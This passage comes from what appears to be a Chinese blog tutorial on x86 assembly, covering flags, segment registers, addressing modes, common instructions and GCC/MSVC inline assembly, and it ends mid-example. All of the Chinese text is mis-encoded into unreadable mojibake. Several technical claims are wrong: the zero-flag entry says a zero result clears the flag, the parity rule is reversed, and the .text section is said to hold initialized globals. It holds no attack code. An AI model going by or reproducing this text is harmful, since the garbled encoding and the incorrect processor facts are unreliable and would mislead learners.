æ­¤æˆ‘ä»¬å¯ä»¥ä¸€æ¬¡é€æ­¥æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ã€‚</li><li><strong>ç¬¦å·æ ‡å¿—ï¼ˆSFï¼‰</strong> -æ­£ç»“æœå°†SFçš„å€¼æ¸…é™¤ä¸º0ï¼Œè´Ÿç»“æœå°†å…¶è®¾ç½®ä¸º1ã€‚</li><li><strong>é›¶æ ‡å¿—ï¼ˆZFï¼‰</strong> -éé›¶ç»“æœå°†é›¶æ ‡å¿—æ¸…é›¶ï¼Œé›¶ç»“æœå°†å…¶æ¸…é›¶ã€‚</li><li><strong>è¾…åŠ©è¿›ä½æ ‡å¿—ï¼ˆAFï¼‰</strong> -åŒ…å«ç»è¿‡ç®—æœ¯è¿ç®—åä»ä½3åˆ°ä½4çš„è¿›ä½ï¼›ç”¨äºä¸“ä¸šç®—æœ¯ã€‚å½“1å­—èŠ‚ç®—æœ¯è¿ç®—å¼•èµ·ä»ç¬¬3ä½åˆ°ç¬¬4ä½çš„è¿›ä½æ—¶ï¼Œå°†è®¾ç½®AFã€‚</li><li><strong>å¥‡å¶æ ¡éªŒæ ‡å¿—ï¼ˆPFï¼‰</strong> -å¶æ•°ä¸ª1ä½å°†å¥‡å¶æ ¡éªŒæ ‡å¿—æ¸…ä¸º0ï¼Œå¥‡æ•°ä¸ª1ä½å°†å¥‡å¶æ ¡éªŒæ ‡å¿—æ¸…ä¸º1ã€‚</li><li><strong>è¿›ä½æ ‡å¿—ï¼ˆCFï¼‰</strong> -åœ¨ç®—æœ¯è¿ç®—åï¼Œå®ƒåŒ…å«ä¸€ä¸ªé«˜ä½ï¼ˆæœ€å·¦è¾¹ï¼‰çš„0æˆ–1è¿›ä½ã€‚</li></ul><h2 id="ï¼ˆä¸‰ï¼‰ã€æ®µå¯„å­˜å™¨"><a href="#ï¼ˆä¸‰ï¼‰ã€æ®µå¯„å­˜å™¨" class="headerlink" title="ï¼ˆä¸‰ï¼‰ã€æ®µå¯„å­˜å™¨"></a>ï¼ˆä¸‰ï¼‰ã€æ®µå¯„å­˜å™¨</h2><ul><li><strong>CS</strong>ï¼š<u><strong>ä»£ç æ®µå¯„å­˜å™¨</strong></u>ï¼ŒåŒ…å«å½“å‰æ­£åœ¨æ‰§è¡Œçš„ä»£ç çš„æ®µåŸºå€ã€‚</li><li><strong>DS</strong>ï¼š<strong><u>æ•°æ®æ®µå¯„å­˜å™¨</u></strong>ï¼Œé€šå¸¸åŒ…å«ç¨‹åºæ­£åœ¨æ“ä½œçš„æ•°æ®çš„æ®µåŸºå€ã€‚</li><li><strong>SS</strong>ï¼š<strong><u>å †æ ˆæ®µå¯„å­˜å™¨</u></strong>ï¼ŒåŒ…å«å½“å‰å †æ ˆçš„æ®µåŸºå€ã€‚</li><li><strong>ES</strong>ï¼š<strong><u>é™„åŠ æ®µå¯„å­˜å™¨</u></strong>ï¼Œç”¨äºå­˜å‚¨å…¶ä»–æ•°æ®æ®µçš„åŸºå€ã€‚</li><li><strong>FS</strong></li><li><strong>GS</strong></li></ul><h2 id="ï¼ˆå››ï¼‰8086CPUç»™å‡ºç‰©ç†åœ°å€çš„æ–¹æ³•"><a href="#ï¼ˆå››ï¼‰8086CPUç»™å‡ºç‰©ç†åœ°å€çš„æ–¹æ³•" class="headerlink" title="ï¼ˆå››ï¼‰8086CPUç»™å‡ºç‰©ç†åœ°å€çš„æ–¹æ³•"></a>ï¼ˆå››ï¼‰8086CPUç»™å‡ºç‰©ç†åœ°å€çš„æ–¹æ³•</h2><p><strong>ç‰©ç†åœ°å€=æ®µåœ°å€x16+åç§»åœ°å€</strong></p><p>ç”¨ä¸¤ä¸ª16ä½åœ°å€ï¼ˆæ®µåœ°å€ã€åç§»åœ°å€ï¼‰åˆæˆä¸€ä¸ª20ä½ç‰©ç†åœ°å€</p><p>æ®µåœ°å€ x 16 æ˜¯åå…­è¿›åˆ¶<strong>æ®µåœ°å€æ•°æ®å·¦ç§»ä¸€ä½</strong></p><h2 id="ï¼ˆäº”ï¼‰ã€å†…å­˜å’Œå¯»å€"><a href="#ï¼ˆäº”ï¼‰ã€å†…å­˜å’Œå¯»å€" class="headerlink" title="ï¼ˆäº”ï¼‰ã€å†…å­˜å’Œå¯»å€"></a>ï¼ˆäº”ï¼‰ã€å†…å­˜å’Œå¯»å€</h2><h3 id="æ®µåˆ†å¸ƒ"><a href="#æ®µåˆ†å¸ƒ" class="headerlink" title="æ®µåˆ†å¸ƒ"></a>æ®µåˆ†å¸ƒ</h3><ul><li><strong>text</strong>: å­˜æ”¾çš„æ˜¯äºŒè¿›åˆ¶æœºå™¨ç ï¼Œç”¨äºå­˜å‚¨ç¨‹åºä¸­å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ï¼Œåªè¯»</li><li><strong>.data</strong>: ç”¨äºå­˜å‚¨ç¨‹åºä¸­å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ã€‚éé»˜è®¤å€¼</li><li><strong>.bss</strong>ï¼šå­˜æ”¾æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œæˆ–è€…é»˜è®¤åˆå§‹åŒ–çš„å…¨å±€å˜é‡ã€‚è¿™ä¸€éƒ¨åˆ†åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ä¸å ç¡¬ç›˜ç©ºé—´ï¼Œå³ä¸ä¼šçœŸå®å­˜å‚¨è¿™äº›ä¸ºåˆå§‹åŒ–çš„å˜é‡ï¼Œè€Œæ˜¯åœ¨ç¨‹åºåŠ è½½åˆ°å†…å­˜æ—¶å†åˆ†é…ã€‚å½“ç„¶è‚¯å®šéœ€è¦æœ‰ä¸ªæ ‡è¯†ï¼Œå‘Šè¯‰è¯¥æ€ä¹ˆåˆ†é…å†…å­˜</li><li><strong>.rodata</strong>ï¼šå­˜æ”¾åªè¯»æ•°æ®ï¼Œå¦‚å¸¸é‡æ•°æ®</li></ul><h3 id="å£°æ˜é™æ€æ•°æ®åŒº"><a href="#å£°æ˜é™æ€æ•°æ®åŒº" class="headerlink" title="å£°æ˜é™æ€æ•°æ®åŒº"></a>å£°æ˜é™æ€æ•°æ®åŒº</h3><p>.DATAå£°æ˜é™æ€æ•°æ®åŒº</p><p><strong>åœ¨æ±‡ç¼–ä¸­åªæœ‰ä¸€ç»´æ•°ç»„</strong>ï¼Œåªæœ‰æ²¡æœ‰äºŒç»´å’Œå¤šç»´æ•°ç»„ã€‚</p><h3 id="å†…å­˜å¯»å€"><a href="#å†…å­˜å¯»å€" class="headerlink" title="å†…å­˜å¯»å€"></a>å†…å­˜å¯»å€</h3><ul><li><strong>ç«‹å³å¯»å€</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 123 ; rax = 123</span><br></pre></td></tr></table></figure><ul><li><strong>å¯„å­˜å™¨å¯»å€</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add rax, rbx ; rax = rax + rbx</span><br></pre></td></tr></table></figure><ul><li><strong>ç›´æ¥å¯»å€</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [someVariable] ; eax = contents of memory at address someVariable</span><br></pre></td></tr></table></figure><ul><li><strong>é—´æ¥å¯»å€</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [rbx] ; eax = contents of memory at address stored in rbx</span><br></pre></td></tr></table></figure><ul><li><strong>åŸºå€å¯»å€</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [rbx+4] ; eax = contents of memory at address (rbx + 4)</span><br></pre></td></tr></table></figure><ul><li><strong>ç´¢å¼•å¯»å€</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [rbx+rcx*4] ; eax = contents of memory at address (rbx + rcx*4)</span><br></pre></td></tr></table></figure><ul><li><strong>åŸºå€å˜å€å¯»å€</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [rbx+rcx+4] ; eax = contents of memory at address (rbx + rcx + 4)</span><br></pre></td></tr></table></figure><h3 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h3><p>å› ä¸ºç”¨æˆ·ä¸»åŠ¨è¯·æ±‚è€Œåˆ’åˆ†å‡ºæ¥çš„å†…å­˜åŒºåŸŸï¼Œå«åš Heapï¼ˆå †ï¼‰ã€‚</p><p>å®ƒç”±èµ·å§‹åœ°å€å¼€å§‹ï¼Œä»ä½ä½ï¼ˆåœ°å€ï¼‰å‘é«˜ä½ï¼ˆåœ°å€ï¼‰å¢é•¿ã€‚</p><p>Heap çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹å°±æ˜¯ä¸ä¼šè‡ªåŠ¨æ¶ˆå¤±ï¼Œå¿…é¡»æ‰‹åŠ¨é‡Šæ”¾ï¼Œæˆ–è€…ç”±åƒåœ¾å›æ”¶æœºåˆ¶æ¥å›æ”¶ã€‚</p><h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>é™¤äº† Heap ä»¥å¤–ï¼Œå…¶ä»–çš„å†…å­˜å ç”¨å«åš Stackï¼ˆæ ˆï¼‰ã€‚ç®€å•è¯´ï¼ŒStack æ˜¯ç”±äºå‡½æ•°è¿è¡Œè€Œä¸´æ—¶å ç”¨çš„å†…å­˜åŒºåŸŸã€‚</p><p><img src="https://www.ruanyifeng.com/blogimg/asset/2018/bg2018012210.png" alt="img"></p><h2 id="ï¼ˆå…­ï¼‰ã€æŒ‡ä»¤"><a href="#ï¼ˆå…­ï¼‰ã€æŒ‡ä»¤" class="headerlink" title="ï¼ˆå…­ï¼‰ã€æŒ‡ä»¤"></a>ï¼ˆå…­ï¼‰ã€æŒ‡ä»¤</h2><h3 id="leaå’ŒmovæŒ‡ä»¤"><a href="#leaå’ŒmovæŒ‡ä»¤" class="headerlink" title="leaå’ŒmovæŒ‡ä»¤"></a>leaå’ŒmovæŒ‡ä»¤</h3><p>LEAæŒ‡ä»¤å°†å…¶ç¬¬äºŒä¸ªæ“ä½œå¯¹è±¡æŒ‡å®šçš„åœ°å€æ”¾å…¥å…¶ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡æŒ‡å®šçš„å¯„å­˜å™¨ä¸­ã€‚</p><p>MOVæŒ‡ä»¤å°†å…¶ç¬¬äºŒæ“ä½œå¯¹è±¡ï¼ˆå³å¯„å­˜å™¨å†…å®¹ã€å†…å­˜å†…å®¹æˆ–å¸¸é‡å€¼ï¼‰æ‰€å¼•ç”¨çš„æ•°æ®é¡¹å¤åˆ¶åˆ°å…¶ç¬¬ä¸€æ“ä½œå¯¹è±¡ï¼ˆå³å¯„å­˜å™¨æˆ–å†…å­˜ï¼‰æ‰€å¼•ç”¨çš„ä½ç½®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [ebx]     ; å°†EBXä¸­çš„åœ°å€æ‰€æŒ‡å‘çš„å†…å­˜ä¸­çš„4ä¸ªå­—èŠ‚ç§»åŠ¨åˆ°EAXä¸­</span><br><span class="line">mov [var], ebx     ; å°†EBXçš„å†…å®¹ç§»åˆ°å†…å­˜åœ°å€varçš„4ä¸ªå­—èŠ‚ä¸­(æ³¨æ„ï¼Œä¸åŠ ä¸­æ‹¬å·çš„varæ˜¯ä¸€ä¸ª32ä½åœ°å€å¸¸é‡ï¼ŒåŠ ä¸­æ‹¬å·æ‰æ˜¯å–åœ°å€æŒ‡å‘çš„å†…å®¹)</span><br><span class="line">mov eax, [esi-4] ; å°†å†…å­˜åœ°å€ESI+(-4)ä¸Šçš„4ä¸ªå­—èŠ‚ç§»å…¥EAX</span><br><span class="line">mov [esi+eax], cl ; å°†CLçš„å†…å®¹ç§»åˆ°åœ°å€ä¸ºESI+EAXçš„å•å­—èŠ‚ä¸­</span><br><span class="line">mov edx, [esi+4*ebx] ; å°†åœ°å€ä¸ºESI+4*EBXçš„4å­—èŠ‚æ•°æ®ç§»åŠ¨åˆ°EDXä¸­</span><br></pre></td></tr></table></figure><h3 id="ADDã€SUBæŒ‡ä»¤"><a href="#ADDã€SUBæŒ‡ä»¤" class="headerlink" title="ADDã€SUBæŒ‡ä»¤"></a>ADDã€SUBæŒ‡ä»¤</h3><p>ç”¨äºå¯¹å­—èŠ‚ï¼Œå­—å’ŒåŒå­—å¤§å°çš„äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œç®€å•çš„åŠ /å‡ï¼Œå³åˆ†åˆ«ç”¨äºæ·»åŠ æˆ–å‡å»8ä½ï¼Œ16ä½æˆ–32ä½æ“ä½œæ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">add &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">add &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">add &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">add &lt;mem&gt;,&lt;con&gt;</span><br><span class="line">sub al, ah ; AL â† AL - AH</span><br><span class="line">sub eax, 216 ; ä»å­˜å‚¨åœ¨EAXä¸­çš„å€¼ä¸­å‡å»216</span><br></pre></td></tr></table></figure><h3 id="INCå’ŒDECæŒ‡ä»¤"><a href="#INCå’ŒDECæŒ‡ä»¤" class="headerlink" title="INCå’ŒDECæŒ‡ä»¤"></a>INCå’ŒDECæŒ‡ä»¤</h3><p>ç›®æ ‡æ“ä½œæ•°å¯ä»¥æ˜¯8ä½ï¼Œ16ä½æˆ–32ä½æ“ä½œæ•°ã€‚</p><p>INCæŒ‡ä»¤ç”¨äºå°†æ“ä½œæ•°åŠ 1ã€‚</p><p>DECæŒ‡ä»¤ç”¨äºå°†æ“ä½œæ•°å‡1ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INC EBX      ;  32-bit å¯„å­˜å™¨ è‡ªå¢1</span><br><span class="line">INC DL       ;  8-bit å¯„å­˜å™¨ è‡ªå¢1</span><br><span class="line">INC [count]  ;  å˜é‡count  è‡ªå¢1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="imulã€idiv"><a href="#imulã€idiv" class="headerlink" title="imulã€idiv"></a>imulã€idiv</h3><p>æ•´æ•°ä¹˜é™¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">imul &lt;reg32&gt;,&lt;reg32&gt;</span><br><span class="line">imul &lt;reg32&gt;,&lt;mem&gt;</span><br><span class="line">imul &lt;reg32&gt;,&lt;reg32&gt;,&lt;con&gt;</span><br><span class="line">imul &lt;reg32&gt;,&lt;mem&gt;,&lt;con&gt;</span><br><span class="line"></span><br><span class="line">imul eax, [var] ; å°†EAXçš„å†…å®¹ä¹˜ä»¥å†…å­˜ä½ç½®varçš„32ä½å†…å®¹å¹¶å°†ç»“æœå­˜å‚¨åœ¨EAXä¸­</span><br><span class="line">imul esi, edi, 25 ; ESI â†’ EDI * 25</span><br><span class="line"></span><br><span class="line">idiv &lt;reg32&gt;</span><br><span class="line">idiv &lt;mem&gt;</span><br><span class="line"></span><br><span class="line">idiv ebx ; å°†EDX:EAXçš„å†…å®¹é™¤ä»¥EBXçš„å†…å®¹ã€‚æŠŠå•†æ”¾åœ¨EAXä¸­ï¼Œä½™æ”¾åœ¨EDXä¸­</span><br><span class="line">idiv DWORD PTR [var] ; å°†EDX:EAXçš„å†…å®¹é™¤ä»¥å­˜å‚¨åœ¨å†…å­˜ä½ç½®varçš„32ä½å€¼ã€‚æŠŠå•†æ”¾åœ¨EAXä¸­ï¼Œä½™æ”¾åœ¨EDXä¸­</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="and-or-xoræŒ‡ä»¤"><a href="#and-or-xoræŒ‡ä»¤" class="headerlink" title="and, or, xoræŒ‡ä»¤"></a><strong>and, or, xor</strong>æŒ‡ä»¤</h3><p>æŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">and &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">and &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">and &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">and &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">and &lt;mem&gt;,&lt;con&gt;</span><br><span class="line"></span><br><span class="line">and eax, 0fH ; æ¸…é™¤EAXçš„é™¤æœ€å4ä½ä»¥å¤–çš„æ‰€æœ‰ä½</span><br><span class="line">xor edx, edx ; å°†EDXçš„å†…å®¹è®¾ç½®ä¸ºé›¶</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="notã€negæŒ‡ä»¤"><a href="#notã€negæŒ‡ä»¤" class="headerlink" title="notã€negæŒ‡ä»¤"></a>notã€negæŒ‡ä»¤</h3><p>NOT æŒ‡ä»¤è§¦å‘ï¼ˆç¿»è½¬ï¼‰æ“ä½œå¯¹è±¡ä¸­çš„æ‰€æœ‰ä½ã€‚å…¶ç»“æœè¢«ç§°ä¸ºåç ã€‚</p><p>NEGæ˜¯æ±‡ç¼–æŒ‡ä»¤ä¸­çš„æ±‚è¡¥æŒ‡ä»¤ï¼Œå¯¹æ“ä½œå¯¹è±¡æ‰§è¡Œæ±‚è¡¥è¿ç®—ï¼šç”¨é›¶å‡å»æ“ä½œå¯¹è±¡ï¼Œç„¶åç»“æœè¿”å›æ“ä½œå¯¹è±¡ã€‚</p><p>ï¼ˆå°†æ“ä½œå¯¹è±¡æŒ‰ä½å–åååŠ 1ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">not &lt;reg&gt;</span><br><span class="line">not &lt;mem&gt;</span><br><span class="line"></span><br><span class="line">not BYTE PTR [var] ; å–åå†…å­˜ä½ç½®varçš„å­—èŠ‚ä¸­çš„æ‰€æœ‰ä½</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="shl-shræŒ‡ä»¤"><a href="#shl-shræŒ‡ä»¤" class="headerlink" title="shl, shræŒ‡ä»¤"></a><strong>shl, shr</strong>æŒ‡ä»¤</h3><p> å·¦ç§»ï¼Œå³ç§»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shl &lt;reg&gt;,&lt;con8&gt;</span><br><span class="line">shl &lt;mem&gt;,&lt;con8&gt;</span><br><span class="line">shl &lt;reg&gt;,&lt;cl&gt;</span><br><span class="line">shl &lt;mem&gt;,&lt;cl&gt;</span><br><span class="line"></span><br><span class="line">shl eax, 1 ; å°†EAXçš„å€¼ä¹˜ä»¥2ï¼ˆå¦‚æœæœ€é«˜æœ‰æ•ˆä½ä¸º0ï¼‰</span><br><span class="line">shr ebx, cl ; å°†EBXçš„å€¼é™¤ä»¥2^n^çš„ç»“æœçš„ä¸‹é™å­˜å‚¨åœ¨EBXä¸­ï¼Œå…¶ä¸­næ˜¯CLä¸­çš„å€¼</span><br></pre></td></tr></table></figure><h3 id="JMPåŠè¡ç”Ÿ"><a href="#JMPåŠè¡ç”Ÿ" class="headerlink" title="JMPåŠè¡ç”Ÿ"></a>JMPåŠè¡ç”Ÿ</h3><p>æ— æ¡ä»¶è·³è½¬</p><div class="table-container"><table><thead><tr><th>JMP</th><th>æ— æ¡ä»¶è·³è½¬æŒ‡ä»¤</th></tr></thead><tbody><tr><td><strong>JC</strong></td><td>è¿›ä½æ—¶è·³è½¬</td></tr><tr><td><strong>JO</strong></td><td>æº¢å‡ºæ—¶è·³è½¬</td></tr><tr><td><strong>JE</strong>/<strong>JZ</strong></td><td>ç›¸ç­‰/é›¶æ—¶è·³è½¬</td></tr><tr><td><strong>JS</strong></td><td>è´Ÿæ•°æ—¶è·³è½¬</td></tr><tr><td><strong>JP</strong>/<strong>JPE</strong></td><td>å¥‡å¶æ ¡éªŒæ—¶è·³è½¬</td></tr><tr><td></td></tr></tbody></table></div><h3 id="CMPæŒ‡ä»¤"><a href="#CMPæŒ‡ä»¤" class="headerlink" title="CMPæŒ‡ä»¤"></a>CMPæŒ‡ä»¤</h3><p>æ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMP DX, 00  ; å°†DXå€¼ä¸0è¿›è¡Œæ¯”è¾ƒ</span><br><span class="line">JE  L7      ; å¦‚æœç­‰äºï¼Œåˆ™è·³è½¬åˆ°æ ‡ç­¾L7</span><br></pre></td></tr></table></figure><h3 id="LOOPæŒ‡ä»¤"><a href="#LOOPæŒ‡ä»¤" class="headerlink" title="LOOPæŒ‡ä»¤"></a>LOOPæŒ‡ä»¤</h3><p>å®ç°å¾ªç¯ï¼ˆè®¡æ•°å‹å¾ªç¯ï¼‰</p><p>CX = CX -1</p><p>åˆ¤æ–­CXä¸­çš„å€¼ï¼Œä¸ä¸º0åˆ™ç»§ç»­è·³è½¬ï¼›ä¸º0åˆ™å‘ä¸‹æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOOP    label</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ä¸ƒ-ã€è°ƒç”¨çº¦å®š"><a href="#ä¸ƒ-ã€è°ƒç”¨çº¦å®š" class="headerlink" title="(ä¸ƒ)ã€è°ƒç”¨çº¦å®š"></a>(ä¸ƒ)ã€è°ƒç”¨çº¦å®š</h2><h3 id="ç³»ç»Ÿè°ƒç”¨"><a href="#ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨"></a><strong>ç³»ç»Ÿè°ƒç”¨</strong></h3><p>æ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·æ€è¿è¡Œçš„è¿›ç¨‹ä¸ç¡¬ä»¶è®¾å¤‡ä¹‹é—´è¿›è¡Œäº¤äº’æä¾›äº†ä¸€ç»„æ¥å£ã€‚</p><p>å®è´¨ä¸Šå°±æ˜¯<strong><em>\</em>å‡½æ•°è°ƒç”¨**</strong>ï¼Œåªä¸è¿‡è°ƒç”¨çš„æ˜¯<strong><em>\</em>ç³»ç»Ÿå‡½æ•°**</strong>ï¼Œå¤„äºå†…æ ¸æ€è€Œå·²</p><p>åœ¨Linuxä¸­ï¼ŒEAXå¯„å­˜å™¨æ˜¯è´Ÿè´£ä¼ é€’ç³»ç»Ÿè°ƒç”¨å·çš„ã€‚</p><h1 id="å†…è”æ±‡ç¼–"><a href="#å†…è”æ±‡ç¼–" class="headerlink" title="å†…è”æ±‡ç¼–"></a>å†…è”æ±‡ç¼–</h1><h2 id="ï¼ˆä¸€ï¼‰ã€å†…è”å‡½æ•°"><a href="#ï¼ˆä¸€ï¼‰ã€å†…è”å‡½æ•°" class="headerlink" title="ï¼ˆä¸€ï¼‰ã€å†…è”å‡½æ•°"></a>ï¼ˆä¸€ï¼‰ã€å†…è”å‡½æ•°</h2><p>å†…è”æ±‡ç¼–æ˜¯æŒ‡åœ¨é«˜çº§è¯­è¨€ä¸­åµŒå…¥æ±‡ç¼–ä»£ç ï¼Œï¼Œå‡å°‘å‡½æ•°è°ƒç”¨ã€‚</p><h2 id="ï¼ˆäºŒï¼‰ã€å†…è”æ±‡ç¼–è¯­æ³•"><a href="#ï¼ˆäºŒï¼‰ã€å†…è”æ±‡ç¼–è¯­æ³•" class="headerlink" title="ï¼ˆäºŒï¼‰ã€å†…è”æ±‡ç¼–è¯­æ³•"></a>ï¼ˆäºŒï¼‰ã€å†…è”æ±‡ç¼–è¯­æ³•</h2><h3 id="1-åœ¨-GCC-ä¸­"><a href="#1-åœ¨-GCC-ä¸­" class="headerlink" title="1. åœ¨ GCC ä¸­"></a>1. åœ¨ GCC ä¸­</h3><p>ä½¿ç”¨ <code>asm</code> æˆ– <code>__asm__</code> å…³é”®å­—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;assembly-code&quot;</span> : output : input : clobbered_registers);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>, result;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;addl %%ebx, %%eax&quot;</span></span><br><span class="line">    : <span class="string">&quot;=a&quot;</span>(result)           <span class="comment">// è¾“å‡ºçº¦æŸï¼Œ`a` è¡¨ç¤ºä½¿ç”¨ EAX å¯„å­˜å™¨</span></span><br><span class="line">    : <span class="string">&quot;a&quot;</span>(a), <span class="string">&quot;b&quot;</span>(b)         <span class="comment">// è¾“å…¥çº¦æŸï¼Œ`b` è¡¨ç¤ºä½¿ç”¨ EBX å¯„å­˜å™¨</span></span><br><span class="line">    : <span class="string">&quot;cc&quot;</span>);                 <span class="comment">// é€šçŸ¥ç¼–è¯‘å™¨æ¡ä»¶ç è¢«ä¿®æ”¹</span></span><br></pre></td></tr></table></figure><h3 id="å…³é”®çº¦æŸï¼š"><a href="#å…³é”®çº¦æŸï¼š" class="headerlink" title="å…³é”®çº¦æŸï¼š"></a>å…³é”®çº¦æŸï¼š</h3><ul><li><strong>æ“ä½œæ•°çº¦æŸ</strong>ï¼š<ul><li><code>&quot;r&quot;</code>ï¼šä»»æ„å¯„å­˜å™¨</li><li><code>&quot;m&quot;</code>ï¼šå†…å­˜æ“ä½œæ•°</li><li><code>&quot;i&quot;</code>ï¼šç«‹å³æ•°</li><li><code>&quot;a&quot;</code>ï¼šEAX</li><li><code>&quot;b&quot;</code>ï¼šEBX ç­‰</li></ul></li><li><strong>ä¿®é¥°ç¬¦</strong>ï¼š<ul><li><code>=ï¼š</code>ï¼šè¡¨ç¤ºå†™å…¥è¾“å‡º</li><li><code>+ï¼š</code>ï¼šè¡¨ç¤ºè¯»å†™æ“ä½œ</li><li><code>&amp;ï¼š</code>ï¼šè¡¨ç¤ºæ—©æœŸé‡Šæ”¾å¯„å­˜å™¨</li></ul></li></ul><h3 id="2-åœ¨-MSVC-ä¸­"><a href="#2-åœ¨-MSVC-ä¸­" class="headerlink" title="2. åœ¨ MSVC ä¸­"></a>2. åœ¨ MSVC ä¸­</h3><p>ä½¿ç”¨ <code>__asm</code> å…³é”®å­—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">    mov eax, <span class="number">1</span></span><br><span class="line">    add eax, <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹ï¼š"><a href="#ç¤ºä¾‹ï¼š" class="headerlink" title="ç¤ºä¾‹ï¼š"></a>ç¤ºä¾‹ï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">3</span>, result;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, a</span><br><span class="line">        add eax, b</span><br><span class="line">        mov result, eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span 